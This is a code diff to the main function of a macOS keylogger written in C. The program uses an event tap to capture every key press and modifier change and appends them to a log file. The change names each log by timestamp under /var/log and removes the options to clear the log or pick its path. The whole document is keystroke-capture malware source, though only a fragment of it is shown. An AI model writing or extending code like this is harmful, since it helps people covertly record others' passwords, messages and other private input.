@@ -1,7 +1,11 @@
 #include "keylogger.h"
 
-
 int main(int argc, const char *argv[]) {
+
+    time_t result = time(NULL);
+
+    char logfileLocation[255];
+    sprintf(logfileLocation, "/var/log/keystroke-%ld.log", result);
 
     // Create an event tap to retrieve keypresses.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
@@ -20,21 +24,7 @@ int main(int argc, const char *argv[]) {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-
-    // Clear the logfile if clear argument used or log to specific file if given.
-    if(argc == 2) {
-        if(strcmp(argv[1], "clear") == 0) {
-            fopen(logfileLocation, "w");
-            printf("%s cleared.\n", logfileLocation);
-            fflush(stdout);
-            exit(1);
-        } else {
-            logfileLocation = argv[1];
-        }
-    }
-
     // Get the current time and open the logfile.
-    time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
 
     if (!logfile) {
